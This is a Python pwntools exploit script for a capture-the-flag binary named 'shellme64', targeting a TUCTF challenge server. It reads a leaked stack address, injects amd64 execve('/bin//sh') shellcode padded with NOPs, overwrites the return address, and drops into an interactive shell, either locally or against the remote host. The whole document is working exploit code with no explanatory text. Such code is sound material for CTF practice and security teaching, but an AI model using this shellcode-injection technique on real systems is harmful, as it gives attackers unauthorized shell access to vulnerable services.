from pwn import *

context.arch = 'amd64'

def exploit(p):
    padding = 40
    p.recvuntil("this\n")
    buff = int(p.recvline()[:-1], 16)

    shellcode = asm("""
    push   rax
    xor    rdx,rdx
    xor    rsi,rsi
    movabs rbx, 0x68732f2f6e69622f	
    push   rbx
    push   rsp
    pop    rdi
    mov    al, 0x3b
    syscall
    """)

    payload = ''
    payload += shellcode
    payload += '\x90' * (padding - len(payload))
    payload += p64(buff)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./shellme64")
        exploit(p)
    elif sys.argv[1] == "remote":
        p = remote("chal.tuctf.com", 30507)
        exploit(p)
    else:
        sys.exit(0)